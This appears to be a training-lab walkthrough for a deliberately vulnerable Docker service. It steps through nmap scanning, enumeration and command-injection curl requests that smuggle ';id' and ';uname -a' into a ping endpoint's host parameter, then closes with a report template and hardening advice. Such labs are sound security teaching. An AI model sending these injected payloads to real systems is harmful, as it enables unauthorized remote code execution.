### Scenario: vulnerability lab (command injection in Docker)

#### Important
This lab contains an intentionally vulnerable service. Run it locally only, in an isolated environment.

#### Run
1) docker compose up --build -d
2) docker exec -it vuln-attacker sh

#### Step 1: discovery (scan)
Inside the attacker container:
- nmap -p 1-10000 vuln-target

Expected outcome: port 8080 is open.

#### Step 2: enumeration (identify the service)
- curl -i http://vuln-target:8080/

#### Step 3: normal use
- curl "http://vuln-target:8080/ping?host=127.0.0.1"

#### Step 4: exploit (command injection)
Because the target concatenates untrusted input into a shell command, try:
- curl "http://vuln-target:8080/ping?host=127.0.0.1;id"
- curl "http://vuln-target:8080/ping?host=127.0.0.1;uname -a"

The response should include the command output appended to the HTTP body.

#### Step 5: write a minimal report
- asset: vulnerable endpoint: /ping
- vulnerability type: command injection
- impact: remote code execution in container context
- reproduction steps: the curl payloads above
- recommended fix: remove shell execution and validate input

#### Step 6: hardening delta (suggested)
Create a hardened version:
- do not use shell=True or shell command strings
- allowlist hostnames and IP address formats
- run as non-root
- remove unused tools from the image
- restrict network exposure (no published ports if not required)
